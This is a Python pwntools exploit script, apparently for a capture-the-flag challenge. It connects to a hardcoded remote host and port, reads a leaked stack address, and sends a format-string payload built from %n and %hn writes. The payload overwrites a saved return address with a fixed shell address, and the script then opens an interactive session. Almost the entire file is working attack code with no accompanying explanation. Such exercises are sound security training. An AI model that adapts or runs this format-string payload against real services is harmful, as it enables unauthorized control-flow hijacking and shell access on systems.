#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "47.105.49.57"
remotePort = 5997

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	shell_addr = 0x40825
	ru('?')	
	sl('Y')
	ru('0x')
	ret_addr = int(r(12), 16) + (0x7fffffffe078 - 0x7fffffffe010)
	li('ret_addr ' + hex(ret_addr))

	offset = 8 + 4
	p = '%' + str(offset) +'$n'
	p += '%' + str(0x40) + 'c%' + str(offset + 1) + '$hn'
	p += '%' + str(0x0825 - 0x40) + 'c%' + str(offset + 2) + '$hn'
	p += 'A' * 5
	p += p64(ret_addr + 4)
	p += p64(ret_addr + 2)
	p += p64(ret_addr + 0)

	#db()
	s(p)


	#p = '%$n'



def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
